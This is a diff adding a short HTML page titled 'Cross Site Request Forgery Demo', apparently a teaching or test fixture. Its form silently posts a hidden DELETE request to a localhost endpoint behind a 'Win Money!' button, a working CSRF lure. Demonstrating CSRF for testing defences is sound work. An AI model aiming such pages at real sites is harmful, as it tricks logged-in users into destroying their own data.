@@ -1,0 +1,12 @@
+<!DOCTYPE HTML SYSTEM "about:legacy-compat">
+<html lang="en">
+    <head>
+        <title>Cross Site Request Forgery Demo</title>
+    </head>
+    <body>
+        <form id="command" action="http://localhost:8080/100" method="post">
+            <input type="hidden" name="_method" value="delete">
+            <input value="Win Money!" type="submit">
+        </form>
+    </body>
+</html>
